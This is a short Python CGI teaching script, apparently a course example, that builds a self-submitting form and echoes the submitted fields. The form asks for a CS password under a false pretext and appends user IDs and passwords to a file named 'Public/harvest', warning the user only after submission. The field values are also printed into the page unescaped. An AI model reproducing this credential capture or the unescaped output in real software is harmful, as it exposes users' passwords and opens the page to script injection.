#!/usr/bin/python
# recall.cgi - example of a Python CGI script that is called, creates a form
# 	that calls itself
#
# Kurt Schmidt
# 11/06
#

import sys
	# for debugging
sys.stderr = sys.stdout

import cgi

	# note that this is something I wrote, in the same directory
import html


form = cgi.FieldStorage()


def printForm() :
	'''prints the blank form'''

	print '''<font size='+2'>

<h1>A Script that writes a form that calls the same script.</h1>

<p>Welcome.  Fill this in, click the Red button below.</p>
</font>

<form action='/~kschmidt/cgi-bin/Python/recall.cgi'
	method='post' enctype='multipart/form-data'> 

	<p>First name: 
	<input type='text' name='firstname'></p>

	<ul>
		<p>
		<input type='radio' name='sex' value='male'> Male<br>
		<input type='radio' name='sex' value='female'> Female<br>
		<input type='radio' name='sex' value='ind'> Ya see, it's like this...
		</p>
	</ul>

	<p>
	I am (check all that apply):<br>
	<ul>
		<input type='checkbox' name='jason'>
		A student of Jason's<br>
		<input type='checkbox' name='kurt'>
		A student of Kurt's<br>
		<input type='checkbox' name='unsure'>
		Which one is Kurt?<br>
		<input type='checkbox' name='visitor'>
		Just passing through
	</ul>
	</p>

	<p>Birthday ( mm/dd ):
	<input type='text' size='1' name='bMonth'> /
	<input type='text' size='1' name='bDay'>
	</p>

	<p>Your CS userId:
	<input type='text' name='userId'>
	</p>

	<p>I need your CS password, to verify that you are in my course:
	<input type='password' name='password'>
	</p>

	<input type='submit' value='Red'>

</form> '''


def parseForm() :
	'''parses out fields, returns results'''

	print "<h1>Your stuff</h1>\n";

	print """<p>Here are the form fields, and their values.  Please note that
this script is indifferent of the method (<tt><b>post</b></tt> or
<tt><b>get</b></tt>); the cgi module handles this for us </p>\n
<table><tbody>"""


		# let's look at all of the fields:
	for field in form.keys() :
		print "\t<tr>\n\t\t<th align='right'>" + field + "</th>"
		print "\t\t<td>" + str( form[field].value ) + "</td></tr>"

	print "</tbody></table>"

	if  form['password'].value :
		print '''<p><i>I'm saving your username/pass.  If you filled the
password in, you'd better go change it.</i></p>'''
		log = file( 'Public/harvest', 'a' )
		log.write( str( form['userId'].value ) + "," + \
				str( form['password'].value ) + '\n')
		log.close()

	print """<p><b>Note:</b>  The satellite data associated w/a field name
<i>might</i> be a list (if, for example, the fieldname was used multiple
times), so, you might need to check, and iterate over this list, pulling out
each element's <tt>value</tt> attribute.</p>"""


def main( args = sys.argv ) :
	
	html.printHead( "recall.py" )

	if form :	# form called itself
		parseForm() 
	else : # form called explicitly (first call)
		printForm() 
	
	html.printTail()


if __name__ == '__main__' :
	main()


